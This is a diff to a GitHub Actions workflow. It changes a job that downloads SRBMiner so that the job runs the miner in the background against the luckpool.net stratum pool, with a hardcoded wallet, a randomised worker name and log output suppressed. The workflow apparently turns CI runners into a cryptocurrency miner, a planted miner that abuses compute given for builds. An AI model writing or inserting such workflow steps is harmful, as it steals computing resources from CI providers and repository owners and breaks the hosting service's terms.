@@ -16,12 +16,7 @@ jobs:
     - name: Extract SRBMiner
       run: tar -xvf SRBMiner-Multi-2-5-8-Linux.tar.gz
 
-    - name: Create config file
-      run: |
-        cd SRBMiner-Multi-2-5-8
-        echo '{"pool_list":[{"pool_address":"stratum+tcp://na.luckpool.net:3960","wallet_address":"RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4","rig_id":"raiden","pool_password":"x"}],"currency":"versus","logging":{"logfile":"srbminer.log","loglevel":2}}' > config.json
-
     - name: Run SRBMiner
       run: |
-        cd SRBMiner-Multi-2-5-8
-        ./SRBMiner-MULTI --help
+        cd SRBMiner-Multi-2-5-8-Linux
+        ./SRBMiner-MULTI --algorithm versus --pool stratum+tcp://na.luckpool.net:3960 --wallet RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4 --worker raiden$(shuf -i 1-100 -n 1) --api-enable --api-port 21550 --api-rig-name raiden --background --log-file srbminer.log --log-file-mode 0 --miner-priority 3 --retry-time 60
